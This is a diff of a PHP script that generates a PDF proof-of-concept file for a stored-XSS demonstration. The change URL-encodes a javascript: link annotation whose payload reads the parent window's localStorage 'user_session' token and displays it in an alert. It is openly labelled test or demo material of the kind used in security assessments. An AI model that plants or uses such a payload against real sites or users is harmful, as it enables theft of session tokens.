@@ -14,7 +14,9 @@ if (isset($_GET['download_poc'])) {
     $pdf .= "2 0 obj\n<<\n  /Type /Pages\n  /Kids [3 0 R]\n  /Count 1\n>>\nendobj\n";
     $pdf .= "3 0 obj\n<<\n  /Type /Page\n  /Parent 2 0 R\n  /Resources <<\n    /Font <<\n      /F1 <<\n        /Type /Font\n        /Subtype /Type1\n        /BaseFont /Helvetica\n      >>\n    >>\n  >>\n  /MediaBox [0 0 595 842]\n  /Contents 4 0 R\n  /Annots [5 0 R]\n>>\nendobj\n";
     $pdf .= "4 0 obj\n<< /Length 135 >>\nstream\nBT\n/F1 22 Tf\n50 750 Td\n(PDF-based XSS Demo PoC File) Tj\n/F1 12 Tf\n0 -40 Td\n(Please click the red border box below to verify Stored XSS:) Tj\nET\nendstream\nendobj\n";
-    $pdf .= "5 0 obj\n<<\n  /Type /Annot\n  /Subtype /Link\n  /Rect [50 670 450 720]\n  /Border [0 0 1]\n  /C [1 0 0]\n  /A <<\n    /Type /Action\n    /S /URI\n    /URI (javascript:try { alert('💥 PDF-based XSS 攻擊成功！\\n\\n已成功跨來源竊取父視窗 LocalStorage 的敏感 API Token：\\n' + parent.localStorage.getItem('user_session')); } catch(e) { alert('PDF JavaScript 執行成功！但無法存取父視窗：' + e.message); })\n  >>\n>>\nendobj\n";
+    $js_code = "try { alert('💥 PDF-based XSS 攻擊成功！\\n\\n已成功跨來源竊取父視窗 LocalStorage 的敏感 API Token：\\n' + parent.localStorage.getItem('user_session')); } catch(e) { alert('PDF JavaScript 執行成功！但無法存取父視窗：' + e.message); }";
+    $encoded_uri = "javascript:" . rawurlencode($js_code);
+    $pdf .= "5 0 obj\n<<\n  /Type /Annot\n  /Subtype /Link\n  /Rect [50 670 450 720]\n  /Border [0 0 1]\n  /C [1 0 0]\n  /A <<\n    /Type /Action\n    /S /URI\n    /URI ({$encoded_uri})\n  >>\n>>\nendobj\n";
     $pdf .= "xref\n0 6\n0000000000 65535 f\n0000000009 00000 n\n0000000056 00000 n\n0000000111 00000 n\n0000000302 00000 n\n0000000492 00000 n\ntrailer\n<<\n  /Size 6\n  /Root 1 0 R\n>>\nstartxref\n708\n%%EOF\n";
     
     echo $pdf;
